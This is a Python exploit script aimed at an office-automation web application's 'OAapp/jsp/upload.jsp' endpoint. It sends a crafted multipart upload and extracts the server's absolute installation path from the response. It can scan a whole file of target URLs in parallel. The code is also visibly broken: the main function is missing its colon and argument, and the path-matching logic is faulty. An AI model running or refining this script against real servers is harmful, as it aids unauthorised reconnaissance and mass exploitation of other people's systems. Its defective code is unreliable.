import re
import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
    
def get_filepath(target_url):
    file_url=target_url+'OAapp/jsp/upload.jsp'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5Ur8laykKAWws2QO",
        }
    data='''------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; name="file"; filename="xxx.xml"\r\n
Content-Type: image/png

real path
------WebKitFormBoundary5Ur8laykKAWws2QO
Content-Disposition: form-data; name="filename"

xxx.png
------WebKitFormBoundary5Ur8laykKAWws2QO--'''
    requests.packages.urllib3.disable_warnings()
    respones= requests.post(file_url, headers=headers, data=data, verify=False)
    if respones.status_code == 200 and ".dat" in respones.text:
        path=re.findall(r"(.*?)Tomcat/webapps/.*?\.dat",respones.text, re.M|re.I)
        if path!="":
            path_url=path[1]
        else:
            path=re.findall(r"(.*?)htoadata/appdata/.*?\.dat",respones.text, re.M|re.I)
            path_url=path[1]
    print(path_url)
            
    
def main()   
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    get_filepath(target_url)
    

        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
            
        
